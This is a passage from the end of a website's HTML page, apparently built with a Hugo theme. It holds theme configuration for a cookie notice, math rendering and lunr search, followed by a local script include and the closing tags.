experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
